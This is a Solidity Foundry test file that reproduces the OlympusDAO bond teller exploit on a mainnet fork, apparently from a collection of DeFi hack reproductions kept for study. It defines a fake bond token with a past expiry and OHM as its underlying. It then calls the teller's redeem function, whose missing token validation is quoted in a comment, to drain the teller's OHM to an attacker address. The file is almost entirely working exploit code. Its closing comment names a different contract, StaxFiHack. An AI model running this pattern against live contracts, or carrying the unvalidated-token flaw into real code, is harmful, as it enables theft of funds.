// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";

import {IERC20} from "openzeppelin-contracts/interfaces/IERC20.sol";

interface IBondFixedExpiryTeller {
    function redeem(OlympusDaoExploit token_, uint256 amount_) external;
}

/*
 ** Here is the transaction  .
 **  https://tx.eth.samczsun.com/ethereum/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf
 */

contract OlympusDaoExploit {
    uint48 public expiry = uint48(block.timestamp) - 1 minutes;
    address public underlying = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;

    function burn(address caller, uint256 amount) external {}
}

contract OlympusDaoHack is Test {
    address constant BOND_FIXED_EXPIRY_TELLER =
        0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;
    address constant OHM_TOKEN = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;

    OlympusDaoExploit exploitContract;
    IBondFixedExpiryTeller expiryTellerContract;
    address attacker;

    function setUp() public {
        exploitContract = new OlympusDaoExploit();
        expiryTellerContract = IBondFixedExpiryTeller(BOND_FIXED_EXPIRY_TELLER);
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
    }

    function testExploit() public {
        vm.startPrank(attacker);
        uint256 amount = IERC20(OHM_TOKEN).balanceOf(BOND_FIXED_EXPIRY_TELLER);

        /* The vulnerable function. Doesn't validate ERC20BondToken */

        /*function redeem(ERC20BondToken token_, uint256 amount_) external override nonReentrant {
        if (uint48(block.timestamp) < token_.expiry())
            revert Teller_TokenNotMatured(token_.expiry());
        token_.burn(msg.sender, amount_);
        token_.underlying().transfer(msg.sender, amount_);
        }
        */
        expiryTellerContract.redeem(exploitContract, amount);
        vm.stopPrank();
        assertEq(IERC20(OHM_TOKEN).balanceOf(attacker), amount);
    }
}
// We chose block 15794363 which is the block before that exploit.
//forge test --match-contract StaxFiHack --fork-url "your_alchemy_mainnet_url" --fork-block-number 15794363
